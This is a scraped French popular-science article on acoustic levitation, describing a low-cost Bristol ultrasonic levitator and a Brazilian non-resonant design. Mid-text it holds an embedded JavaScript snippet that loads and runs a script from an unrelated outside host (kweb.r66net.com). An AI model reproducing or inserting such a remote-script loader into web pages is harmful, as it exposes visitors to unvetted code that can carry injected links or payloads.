{"title": "Essayez la levitation acoustique chez vous", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-08-22", "content": "La levitation acoustique, compte tenu de sa difficulte de mise en oeuvre, a longtemps ete confinee au laboratoire. Aujourd'hui, des chercheurs britanniques devoilent les plans d'un appareil capable de faire leviter de petits objets a la force des ultrasons. Un appareil dont le fonctionnement et le prix vous permettraient de l'avoir chez vous. Les tests sanguins ne sont qu'un exemple parmi tant d'autres de techniques qui pourraient etre ameliorees par la  levitation acoustique . Cependant, celle-ci reste encore difficile a mettre en oeuvre. Aujourd'hui, des chercheurs de l' universite de Bristol  (Royaume-Uni) annoncent avoir mis au point un appareil capable de faire leviter de l'eau, des composants electroniques et meme de  petits insectes . Le tout a partir de composants bon marche et facile a assembler. Rappelons que si la  levitation magnetique  exploite des  champs magnetiques  pour suspendre des objets en plein  air , la levitation acoustique compte sur les differences de pressions creees par des  ondes sonores . Une prouesse qui necessitait jusqu'alors des conditions d'operation tres precises et une importante depense d' energie . Quelques exemples d'objets que les chercheurs de l'universite de Bristol sont parvenus a faire leviter : 40 mL d'une solution d'isopropanol et de dioxyde d'etain (a), une fourmi (b), un fragment d'acide polylactique de 2 mm de large (c), un transistor a effet de champ (d), du ketchup et de la moutarde (e), de l'eau (f) et du sucre (g). (c) Asier Marzo, universite de Bristol                               La levitation acoustique dans votre salon Au coeur de cet appareil se trouvent de simples transducteurs ultrasoniques  basse tension  disponibles dans le commerce. Le systeme fonctionne a 40 kHz, dans l'air ambiant, et peut faire leviter des objets d'une densite superieure a 2,2 g/cm 3  ou d'un diametre approchant les 4 mm. Le tout en ne faisant appel qu'a une puissance limitee de quelque 10 W.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Autres composants notables, mais tout aussi faciles d'acces : des  pieces imprimees en 3D  et un module  Arduino . Les chercheurs de l'universite de Bristol pretendent donc que leur appareil pourra bientot etre construit par n'importe quel laboratoire ou meme dans le salon de n'importe quel etudiant. D'autant que la notice de montage complete est gracieusement fournie. Pour en savoir plus La levitation acoustique bientot exploitable Article de  Nathalie Mayer  paru le 08/01/2015 Grace a la levitation, un objet peut theoriquement etre manipule sans qu'il n'y ait de contact  physique . Dans la pratique, le controle de la levitation, et notamment de la levitation acoustique, restait delicat. L'innovation proposee cette semaine par une equipe bresilienne pourrait permettre d'imaginer des  applications  concretes dans les secteurs de la biologie, de la  chimie  analytique ou encore de la pharmaceutique. Des chercheurs de l'universite de Sao Paulo (Bresil) ont mis au point un dispositif de  levitation acoustique  qui permet de faire flotter dans l'air un petit objet, une bille de  polystyrene  de 3 mm de diametre. Jusque la, rien d'extraordinaire. La nouveaute reside dans le fait que ce systeme particulier permet de controler de maniere precise la  levitation  et les deplacements de l'objet en question. Pour envisager de veritables applications concretes, comme la manipulation de  matieres  dangereuses ou de substances chimiquement sensibles, comme des produits pharmaceutiques par exemple, il reste maintenant a ameliorer la methode afin de pouvoir l'appliquer a des objets un peu plus lourds. Le fonctionnement de ce dispositif est detaille dans un article paru cette semaine dans la revue  Applied Physics Letters . Il repose sur l'utilisation d'une source d' ondes sonores , placee au-dessus d'une bille de polystyrene, et d'un reflecteur  concave , place en dessous. Deplacer le reflecteur permet de deplacer egalement la bille de polystyrene, sans entrer en contact avec elle.  Toutes les formes de levitation, la  levitation electromagnetique  ou la levitation aerodynamique, par exemple, sont le resultat de forces plus fortes que la  gravitation , appliquees a un objet. Dans le cas de la  levitation acoustique , c'est la pression acoustique qui est responsable de la suspension des objets dans l'air. Car, en effet, en se propageant, une  onde sonore  cree dans l'air des zones de legeres depressions et surpressions (environ 10 millions de fois plus faibles que la  pression atmospherique ) qui suffisent a faire vibrer nos  tympans ... ou a faire leviter de petits objets. Grace a un dispositif a ultrasons, une equipe de chercheurs bresiliens est parvenue a controler les mouvements en levitation de billes de polystyrene. Sur l'image de droite, une simulation du phenomene. (c) M. Andrade, Universite de Sao Paulo                               Manipuler des particules grace a la levitation acoustique La  levitation acoustique  a deja ete exploitee par le passe. Dans un dispositif traditionnel, une source emet des ondes sonores a haute  frequence . Celles-ci frappent le fond d'un reflecteur concave et sont alors reflechies. Ces ondes reflechies interagissent ensuite avec les ondes emises par la source, produisant des ondes stationnaires. Ces dernieres presentent des points de pression acoustique minimale qui, s'ils sont suffisamment forts, peuvent contrecarrer la force de  gravite  et permettre a un petit objet de leviter. Jusqu'a present, la mise en oeuvre de tels dispositifs etait restee complexe. Sources sonores et reflecteurs devaient etre places a des distances precises, dites distances de resonnance. Une distance egale a un multiple de la demi-longueur d'onde des ondes sonores emises. Sans quoi les ondes stationnaires ne se formaient pas et la levitation n'avait pas lieu. Meme si des chercheurs avaient ainsi reussi, non seulement a pieger de petits objets en suspension, mais aussi a les deplacer sur de courtes distances, le controle precis du deplacement de ces objets etait reste impossible.  Les chercheurs bresiliens, quant a eux, utilisent un dispositif non resonnant, beaucoup plus simple a manipuler. L'onde stationnaire, qui entraine la levitation, est creee par la superposition de l'onde emise et de la premiere onde reflechie. La petite taille du reflecteur permet de minimiser les reflexions multiples qui pourraient parasiter le phenomene. Les chercheurs bresiliens assurent que leur levitateur acoustique est robuste aux perturbations et que la distance entre l'emetteur et le reflecteur peut varier de facon continue sans affecter les proprietes de levitation. Notamment parce que le reflecteur qu'ils utilisent permet d'augmenter les forces  axiales  et laterales qui agissent sur les particules en levitation. Des bijoux en levitation                       Si la levitation supraconductrice fonctionne un jour a temperature ambiante, on pourra imaginer de nouveaux bijoux en levitation, guides par des cremes magnetiques.                                       ", "theme": "sciences"}